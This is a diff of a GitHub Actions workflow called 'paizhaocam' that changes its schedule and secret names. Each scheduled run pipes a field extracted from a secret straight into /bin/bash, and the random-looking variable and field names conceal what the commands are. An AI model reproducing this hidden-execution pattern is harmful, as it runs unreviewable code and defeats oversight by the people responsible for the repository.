@@ -1,23 +1,19 @@
 name: paizhaocam
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '37 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: paizhaocam
         env:
-          cm6: ${{ secrets.cm6 }}
+          uei2: ${{ secrets.uei2 }}
         run: |
-          echo $cm6 | jq -r .viyjb6156 | /bin/bash
-          echo $tgj6 | jq -r .oy7 | /bin/bash
-          echo $zt18325 | jq -r .xnux07382 | /bin/bash
-          echo $fwvvl84 | jq -r .kcise8433 | /bin/bash
-          echo $c543 | jq -r .lo27 | /bin/bash
+          echo $uei2 | jq -r .mvnkr49 | /bin/bash
+          echo $zgwe75806 | jq -r .ydjg43 | /bin/bash
+          echo $mhaue5 | jq -r .fmtl7997 | /bin/bash
 
